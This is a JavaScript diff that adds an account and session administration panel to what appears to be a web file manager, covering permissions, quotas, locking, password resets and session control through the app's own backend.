+  var ava=mfaHas('mfaDrawerAva'),ttl=mfaHas('mfaDrawerTitle');
+  if(ava)ava.textContent=isNew?'+':(name||'?').slice(0,2);
+  if(ttl)ttl.textContent=isNew?'New account':name;
+  mfaDrawerBody();
+  mfaDrawer(true);
+  mfaSay('mfaDrawerMsg','','');
+}
+function mfaDrawerBody(){
+  var box=mfaHas('mfaDrawerBody');if(!box||!MFA_DRAFT)return;
+  var D=MFA_DRAFT;
+  var groups=(MFA.catalog||[]).map(function(g){
+    return '<div class="mfa-box"><div class="bh">'+mfaEsc(g.group)+'</div><div class="mfa-grid">'
+      +(g.items||[]).map(function(i){
+        var on=(D.perms||[]).indexOf(i.id)>=0;
+        return '<label class="mfa-ck"><input type="checkbox" data-dperm="'+i.id+'"'+(on?' checked':'')+'>'
+          +'<span><span class="n">'+mfaEsc(i.name)+'</span><span class="t">'+mfaEsc(i.note)+'</span></span></label>';
+      }).join('')+'</div></div>';
+  }).join('');
+  var presets=(MFA.presets||[]).map(function(p){
+    return '<button type="button" class="mfa-mini" data-preset="'+mfaEsc(p.id)+'" title="'+mfaEsc(p.note)+'">'+mfaEsc(p.name)+'</button>';
+  }).join('');
+  var head=D.isNew
+    ?'<div class="mfa-fld"><label class="mfa-lbl" for="mfaDUser">Account name</label>'
+      +'<input class="mfa-in" id="mfaDUser" style="width:100%" placeholder="three to sixty-four letters" autocomplete="off"></div>'
+      +'<div class="mfa-fld"><label class="mfa-lbl" for="mfaDPass">Password</label>'
+      +'<div style="display:flex;gap:6px"><input class="mfa-in" id="mfaDPass" type="text" style="flex:1" autocomplete="new-password" placeholder="at least eight characters">'
+      +'<button type="button" class="mfa-mini" id="mfaDGen">Generate</button></div></div>'
+    :'<div class="mfa-box"><div class="bh">Account<span class="sp">'+mfaEsc(mfaRole({admin:D.admin,perms:D.perms}))+'</span></div>'
+      +'<div class="mfa-kv"><span>Name</span><b>'+mfaEsc(D.user)+'</b></div>'
+      +'<div class="mfa-kv"><span>Sessions</span><b>'+((D.sessions.active||0)+' active, '+((D.sessions.idle||0))+' idle')+'</b></div>'
+      +'</div>';
+  var permsBox='<div class="mfa-box"><div class="bh">Permissions<span class="sp">'+(D.perms||[]).length+' of '+(MFA.catalog||[]).reduce(function(n,g){return n+(g.items||[]).length;},0)+'</span></div>'
+    +'<div class="mfa-presets">'+presets+'</div>'
+    +(D.primary?'<div class="mfa-note" style="margin-bottom:8px">The primary administrator keeps every permission; the boxes are shown for reference.</div>':'')
+    +groups+'</div>';
+  var scope='<div class="mfa-box"><div class="bh">Scope</div>'
+    +'<div class="mfa-fld"><label class="mfa-lbl" for="mfaDRoot">Folder this account is kept in</label>'
+    +'<input class="mfa-in" id="mfaDRoot" style="width:100%" placeholder="empty: the whole server" value="'+mfaEsc(D.root)+'"></div>'
+    +'<div class="mfa-fld"><label class="mfa-lbl" for="mfaDQuota">Quota in MB, 0 is unlimited</label>'
+    +'<input class="mfa-in" id="mfaDQuota" type="number" min="0" step="1" style="width:120px" value="'+Math.round((D.quota||0)/1048576)+'"></div></div>';
+  var flags='<div class="mfa-box"><div class="bh">Standing</div>'
+    +'<label class="mfa-ck" style="margin-bottom:6px"><input type="checkbox" id="mfaDAdmin"'+(D.admin?' checked':'')+(D.primary?' disabled':'')+'>'
+      +'<span><span class="n">Administrator</span><span class="t">Passes the checks that ask for an administrator, and holds every permission.</span></span></label>'
+    +'<label class="mfa-ck"><input type="checkbox" id="mfaDLock"'+(D.locked?' checked':'')+((D.me||D.primary)?' disabled':'')+'>'
+      +'<span><span class="n">Locked</span><span class="t">Cannot sign in; every open session of this account is signed out at once.</span></span></label></div>';
+  var danger=D.isNew?''
+    :'<div class="mfa-box mfa-danger"><div class="bh">Danger zone</div>'
+      +'<div style="display:flex;gap:6px;flex-wrap:wrap">'
+      +'<button type="button" class="mfa-mini" data-act="pass" data-user="'+mfaEsc(D.user)+'">Reset the password</button>'
+      +(D.primary?'':'<button type="button" class="mfa-mini d" data-act="del" data-user="'+mfaEsc(D.user)+'">Delete this account</button>')
+      +'</div></div>';
+  box.innerHTML=head+permsBox+scope+flags+danger;
+}
+function mfaUpdateDraft(){
+  if(!MFA_DRAFT)return;
+  var perms=[];
+  Array.prototype.forEach.call(document.querySelectorAll('[data-dperm]'),function(c){if(c.checked)perms.push(c.getAttribute('data-dperm'));});
+  MFA_DRAFT.perms=perms;
+  var adm=mfaHas('mfaDAdmin'),lock=mfaHas('mfaDLock'),root=mfaHas('mfaDRoot'),q=mfaHas('mfaDQuota');
+  if(adm)MFA_DRAFT.admin=!!adm.checked;
+  if(lock)MFA_DRAFT.locked=!!lock.checked;
+  if(root)MFA_DRAFT.root=root.value.trim();
+  if(q)MFA_DRAFT.quota=Math.max(0,Math.round((parseFloat(q.value||'0')||0)*1048576));
+}
+async function mfaSaveDraft(){
+  mfaUpdateDraft();
+  var D=MFA_DRAFT;if(!D)return;
+  var extra={user:D.user,perms:D.perms.join(','),perms_given:'1',admin:D.admin?'1':'',
+             root:D.root,quota_mb:(D.quota/1048576)};
+  var res;
+  if(D.isNew){
+    var n=mfaHas('mfaDUser'),p=mfaHas('mfaDPass');
+    extra.user=(n?n.value:'').trim();
+    extra.pass=(p?p.value:'');
+    if(!extra.user||!extra.pass){mfaSay('mfaDrawerMsg','A name and a password are needed.','bad');return;}
+    res=await mfaCall('create',extra);
+  }else{
+    res=await mfaCall('update',extra);
+    if(res&&res.ok&&D.locked!==null){
+      var before=null;(MFA.users||[]).forEach(function(u){if(u.user===D.user)before=u;});
+      if(before&&!!before.locked!==!!D.locked)res=await mfaCall('lock',{user:D.user,locked:D.locked?'1':''});
+    }
+  }
+  if(!res||!res.ok){mfaSay('mfaDrawerMsg',(res&&res.error)||'The change was not saved.','bad');return;}
+  mfaSay('mfaDrawerMsg',res.message||'Saved.','good');
+  await mfaLoad();
+  if(!D.isNew)mfaOpenEditor(D.user);
+}
+async function mfaResetPassword(name){
+  if(!name)return;
+  var p=window.prompt('New password for '+name+' (at least eight characters).\nThey are signed out of every open session.');
+  if(p===null)return;
+  if(String(p).length<8){toast('At least eight characters.');return;}
+  var r=await mfaCall('password',{user:name,pass:p,signout:'1'});
+  if(!r||!r.ok){toast((r&&r.error)||'The password was not changed.');return;}
+  toast(r.message||'Password replaced.');
+  mfaSay('mfaAccMsg',r.message||'','good');
+  await mfaLoad();
+}
+async function mfaDeleteAccount(name){
+  if(!name)return;
+  if(!window.confirm('Delete the account '+name+'?\nIts open sessions are signed out, and its files stay where they are.'))return;
+  var r=await mfaCall('delete',{user:name});
+  if(!r||!r.ok){toast((r&&r.error)||'The account was not deleted.');return;}
+  mfaSay('mfaAccMsg',r.message||'','good');toast(r.message||'');
+  mfaDrawer(false);await mfaLoad();
+}
+async function mfaToggleMatrix(user,perm,on){
+  var u=null;(MFA.users||[]).forEach(function(x){if(x.user===user)u=x;});
+  if(!u)return;
+  var perms=(u.perms||[]).filter(function(p){return p!==perm;});
+  if(on)perms.push(perm);
+  var r=await mfaCall('perms',{user:user,perms:perms.join(',')});
+  if(!r||!r.ok){mfaSay('mfaPermsMsg',(r&&r.error)||'The permission was not changed.','bad');await mfaLoad();return;}
+  mfaSay('mfaPermsMsg',r.message||'Saved.','good');
+  await mfaLoad();
+}
+async function mfaEndSession(sid){
+  if(!sid)return;
+  var r=await mfaCall('sess_end',{sid:sid});
+  if(!r||!r.ok){mfaSay('mfaSessMsg',(r&&r.error)||'The session was not ended.','bad');return;}
+  mfaSay('mfaSessMsg',r.message||'','good');await mfaLoad();
+}
+async function mfaExtendSession(sid,minutes){
+  if(!sid)return;
+  var r=await mfaCall('sess_extend',{sid:sid,minutes:minutes});
+  if(!r||!r.ok){mfaSay('mfaSessMsg',(r&&r.error)||'The session was not extended.','bad');return;}
+  mfaSay('mfaSessMsg',r.message||'','good');await mfaLoad();
+}
+async function mfaEndUserSessions(name){
+  if(!name)return;
+  var r=await mfaCall('sess_end_user',{user:name});
+  if(!r||!r.ok){toast((r&&r.error)||'Nothing was ended.');return;}
+  toast(r.message||'');mfaSay('mfaAccMsg',r.message||'','good');await mfaLoad();
+}
+async function mfaEndOthers(){
+  var r=await mfaCall('sess_end_others');
+  var msg=(r&&(r.message||r.error))||'';
+  mfaSay('mfaQuickMsg',msg,r&&r.ok?'good':'bad');
+  mfaSay('mfaSessMsg',msg,r&&r.ok?'good':'bad');
+  if(r&&r.ok){toast(msg);await mfaLoad();}
+}
+async function mfaRunSelfCheck(){
+  var r=await mfaCall('selfcheck');
+  if(!r||!r.ok){mfaSay('mfaQuickMsg',(r&&r.error)||'The check did not run.','bad');return;}
+  var box=mfaHas('mfaHealth');
+  if(box)box.innerHTML=(r.items||[]).map(function(i){
+    var svg=i.ok
+      ?'<svg viewBox="0 0 24 24" style="stroke:#86efac"><path d="M12 3 20 6v6c0 5-3.4 8.6-8 9.5C7.4 20.6 4 17 4 12V6z"/><path d="m8.6 12.2 2.4 2.3 4.4-4.5"/></svg>'
+      :'<svg viewBox="0 0 24 24" style="stroke:#fca5a5"><circle cx="12" cy="12" r="9"/><path d="M12 8v5M12 16h.01"/></svg>';
+    return '<div class="mfa-hrow">'+svg+'<span class="n">'+mfaEsc(i.name)+'</span><span class="sp">'+mfaEsc(i.note)+'</span></div>';
+  }).join('');
+  mfaSay('mfaQuickMsg',r.passed+' of '+r.total+' checks passed.','good');
+}
+/* ── wiring ─────────────────────────────────────────────────────────────── */
+(function(){
+  var btn=document.getElementById('mfaBtn');
+  if(btn)btn.addEventListener('click',function(){
+    if(typeof openMod==='function')openMod('mfmOv');
+    mfaTab('overview');mfaLoad();
+  });
+  var close=mfaHas('mfaClose');
+  if(close)close.addEventListener('click',function(){
+    if(typeof closeMod==='function')closeMod('mfmOv');else mfaHas('mfmOv').classList.remove('open');
+    mfaDrawer(false);
+  });
+  var ov=mfaHas('mfmOv');
+  if(ov)ov.addEventListener('click',function(e){if(e.target===ov){if(typeof closeMod==='function')closeMod('mfmOv');mfaDrawer(false);}});
+  var rail=mfaHas('mfaRail');
+  if(rail)rail.addEventListener('click',function(e){
+    var b=e.target.closest('.mfa-tab');if(!b)return;
+    mfaTab(b.getAttribute('data-tab'));
+  });
+  var q=mfaHas('mfaAccSearch');if(q)q.addEventListener('input',mfaRenderAccounts);
+  var nb=mfaHas('mfaAccNew');if(nb)nb.addEventListener('click',function(){mfaTab('accounts');mfaOpenEditor('');});
+  var dc=mfaHas('mfaDrawerClose');if(dc)dc.addEventListener('click',function(){mfaDrawer(false);});
+  var dx=mfaHas('mfaDrawerCancel');if(dx)dx.addEventListener('click',function(){mfaDrawer(false);});
+  var ds=mfaHas('mfaDrawerSave');if(ds)ds.addEventListener('click',mfaSaveDraft);
+  var ga=mfaHas('mfaGoAccounts');if(ga)ga.addEventListener('click',function(){mfaTab('accounts');});
+  var gs=mfaHas('mfaGoSessions');if(gs)gs.addEventListener('click',function(){mfaTab('sessions');});
+  var eo=mfaHas('mfaEndOthers');if(eo)eo.addEventListener('click',mfaEndOthers);
+  var sc=mfaHas('mfaSelfCheck');if(sc)sc.addEventListener('click',mfaRunSelfCheck);
+  var pr=mfaHas('mfaPermsReload');if(pr)pr.addEventListener('click',function(){mfaSay('mfaPermsMsg','','');mfaLoad();});
+  var sr=mfaHas('mfaSessReload');if(sr)sr.addEventListener('click',function(){mfaSay('mfaSessMsg','','');mfaLoad();});
+  var lr=mfaHas('mfaLogReload');if(lr)lr.addEventListener('click',mfaLoad);
+  var se=mfaHas('mfaSessEndOthers');if(se)se.addEventListener('click',mfaEndOthers);
+  var panes=mfaHas('mfaPanes');
+  if(panes){
+    panes.addEventListener('click',function(e){
+      var b=e.target.closest('[data-act]');if(!b)return;
+      var act=b.getAttribute('data-act'),user=b.getAttribute('data-user'),sid=b.getAttribute('data-sid');
+      if(act==='edit')mfaOpenEditor(user);
+      else if(act==='pass')mfaResetPassword(user);
+      else if(act==='del')mfaDeleteAccount(user);
+      else if(act==='endsess')mfaEndUserSessions(user);
+      else if(act==='sessend')mfaEndSession(sid);
+      else if(act==='sess15')mfaExtendSession(sid,15);
+      else if(act==='sess60')mfaExtendSession(sid,60);
+      else if(act==='sess1440')mfaExtendSession(sid,1440);
+    });
+    panes.addEventListener('change',function(e){
+      var t=e.target;
+      if(t&&t.getAttribute&&t.getAttribute('data-pmatrix'))mfaToggleMatrix(t.getAttribute('data-user'),t.getAttribute('data-perm'),t.checked);
+    });
+    panes.addEventListener('click',function(e){
+      var p=e.target.closest('[data-preset]');
+      if(!p||!MFA_DRAFT)return;
+      var id=p.getAttribute('data-preset');
+      (MFA.presets||[]).forEach(function(x){if(x.id===id)MFA_DRAFT.perms=(x.perms||[]).slice();});
+      mfaDrawerBody();
+    });
+    panes.addEventListener('click',function(e){
+      if(!e.target.closest('#mfaDGen')||!MFA_DRAFT)return;
+      var alphabet='abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+      var out='';
+      var buf=new Uint8Array(20);
+      if(window.crypto&&window.crypto.getRandomValues)window.crypto.getRandomValues(buf);
+      else for(var i=0;i<20;i++)buf[i]=Math.floor(Math.random()*256);
+      for(var j=0;j<20;j++)out+=alphabet[buf[j]%alphabet.length];
+      var f=mfaHas('mfaDPass');if(f)f.value=out;
+    });
+  }
+})();
+
+/* the old Manage Users window is one click away from the full administration */
+(function(){
+  var b=document.getElementById('usersOpenMfa');
+  if(!b)return;
+  b.addEventListener('click',function(){
+    if(typeof closeMod==='function')closeMod('usersOv');
+    if(typeof openMod==='function')openMod('mfmOv');
+    mfaTab('accounts');mfaLoad();
+  });
+})();
+/* <<MFMJS-END>> */
 
 document.getElementById('ownCancel')?.addEventListener('click',()=>closeMod('ownOv'));
 document.getElementById('ownApply')?.addEventListener('click',ownApplyNow);
